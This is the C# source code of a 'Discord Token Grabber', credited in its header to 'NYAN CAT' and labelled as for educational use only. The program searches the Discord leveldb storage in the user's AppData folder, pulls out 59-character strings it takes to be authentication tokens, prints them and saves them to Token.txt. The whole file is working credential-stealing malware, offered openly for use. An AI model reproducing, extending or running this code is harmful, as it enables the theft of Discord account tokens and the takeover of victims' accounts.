using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace DiscordTokenGrabber
{
    /*
     * │ Author       : NYAN CAT
     * │ Name         : Discord Token Grabber
     * │ Contact      : https:github.com/NYAN-x-CAT
     * 
     * This program is distributed for educational purposes only.
     */

    public class Program
    {
        public static void Main()
        {
            new DiscordToken();
            Console.ReadLine();
        }
    }

    /// <summary>
    /// Get token from dicord folder @AppData\discord\Local Storage\leveld (old method)
    /// </summary>
    public class DiscordToken
    {
        public DiscordToken()
        {
            GetToken();
        }

        /// <summary>
        /// to exctact the token text from ldb file using regex
        /// </summary>
        public void GetToken()
        {
            var files = SearchForFile(); // to get ldb files
            if (files.Count == 0)
            {
                Console.WriteLine("Didn't find any ldb files");
                return;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        Console.WriteLine($"Token={match.ToString()}");
                        using (StreamWriter sw = new StreamWriter("Token.txt", true))
                        {
                            sw.WriteLine($"Token={match.ToString()}");
                        }
                    }
                }
            }
        }

        /// <summary>
        /// check is discord path exists then add "*.ldb" files to list<string>
        /// </summary>
        /// <returns>string</returns>
        private List<string> SearchForFile()
        {
            List<string> ldbFiles = new List<string>();
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(discordPath))
            {
                Console.WriteLine("Discord path not found");
                return ldbFiles;
            }

            foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string rawText = File.ReadAllText(file);
                if (rawText.Contains("oken"))
                {
                    Console.WriteLine($"{Path.GetFileName(file)} added");
                    ldbFiles.Add(rawText);
                }
            }
            return ldbFiles;
        }
    }
}
